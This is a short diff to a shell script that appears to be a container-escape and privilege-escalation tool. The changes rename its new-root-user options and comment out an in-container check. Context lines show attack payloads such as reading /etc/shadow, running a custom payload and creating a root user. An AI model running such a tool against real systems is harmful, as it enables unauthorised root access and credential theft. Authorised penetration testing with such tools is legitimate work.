@@ -77,7 +77,7 @@ Usage: ${0##*/} [OPTIONS...]
   
   -x, --payload          Run a custom executable as the payload
   
-  --user                 Create a new root user
+  --username             Create a new root user
   --password             Password for new root user
   
   ${DG}[General Options]$NC
@@ -860,7 +860,7 @@ prepareExploit() {
     
     cmd="cat /etc/shadow"
     
-  elif [ "$isUserRoot" ]; then
+  elif [ "$username" ]; then
     # New root user
 
     if ! [ "$username" ]; then
@@ -949,6 +949,12 @@ exploitDocker() {
 }
 
 exploitPrivileged() {
+
+#  if ! [ "$inContainer" ]; then
+#    printError "Not in container"
+#    return
+#  fi
+
   printSection "Exploiting Privileged"
   printTip "$TIP_PRIVILEGED_MODE"
   prepareExploit
@@ -1092,7 +1098,7 @@ while [ $# -gt 0 ]; do
     listen="1"
     shift
     ;;
-  --user)
+  --user|--username)
     username="$2"
     shift
     shift
@@ -1102,7 +1108,7 @@ while [ $# -gt 0 ]; do
     shift
     shift
     ;;
-  --pass)
+  --pass|--password)
     password="$2"
     shift
     shift
